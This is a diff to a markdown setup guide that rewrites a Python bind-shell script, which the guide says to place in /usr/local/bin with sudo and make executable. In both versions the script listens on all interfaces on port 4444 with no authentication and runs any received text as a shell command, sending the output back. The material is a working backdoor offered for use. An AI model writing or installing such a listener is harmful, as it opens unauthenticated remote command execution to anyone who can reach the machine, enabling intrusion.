@@ -12,30 +12,37 @@ create file using ```sudo nano /usr/local/bin/bind_shell.py```
 Create a Python script (e.g., `bind_shell.py`) with the following content:
 
 ```python
+#!/usr/bin/env python3
+
 import socket
 import subprocess
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind(("0.0.0.0", 4444))
-s.listen(1)
+def main():
+    # Change the IP address and port as needed
+    bind_ip = "0.0.0.0"
+    bind_port = 4444
 
-print("Listening for incoming connections...")
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    server.bind((bind_ip, bind_port))
+    server.listen(5)
 
-while True:
-    conn, addr = s.accept()
-    print(f"Connection from {addr}")
-    
+    print(f"[*] Listening on {bind_ip}:{bind_port}")
+
     while True:
-        command = conn.recv(1024).decode()
-        if not command:
-            break
-        
-        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        output = process.stdout.read() + process.stderr.read()
-        conn.sendall(output)
+        client, addr = server.accept()
+        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
 
-conn.close()
+        data = client.recv(1024).decode()
+        process = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output = process.stdout.read() + process.stderr.read()
+
+        client.sendall(output)
+        client.close()
+
+if __name__ == "__main__":
+    main()
+
 ```
 ## Save the file and make it executable:
 ``` sudo chmod +x /usr/local/bin/bind_shell.py ```
